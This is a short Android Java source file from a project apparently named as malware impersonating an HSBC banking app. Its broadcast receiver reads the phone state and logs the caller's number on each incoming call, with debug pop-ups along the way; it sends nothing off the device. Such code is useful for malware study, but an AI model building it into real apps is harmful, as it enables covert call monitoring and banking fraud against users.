package com.malware.hsbcfake;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

public class MyPhoneReceiver extends BroadcastReceiver {

	@Override
  	public void onReceive(Context context, Intent intent) {
		Bundle extras = intent.getExtras();
		Toast.makeText(context, "MyPhoneReceiver - 1", Toast.LENGTH_LONG).show();
		if (extras != null) {
			Toast.makeText(context, "MyPhoneReceiver - 2", Toast.LENGTH_LONG).show();
			String state = extras.getString(TelephonyManager.EXTRA_STATE);
			Toast.makeText(context, "MyPhoneReceiver - 3", Toast.LENGTH_LONG).show();
			Log.d("MY_DEBUG_TAG", state);
			Toast.makeText(context, "MyPhoneReceiver - 4", Toast.LENGTH_LONG).show();
			if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
				Toast.makeText(context, "MyPhoneReceiver - 5", Toast.LENGTH_LONG).show();
				String phoneNumber = extras
						.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
				Log.d("MY_DEBUG_TAG", phoneNumber);
			}
		}
	}
} 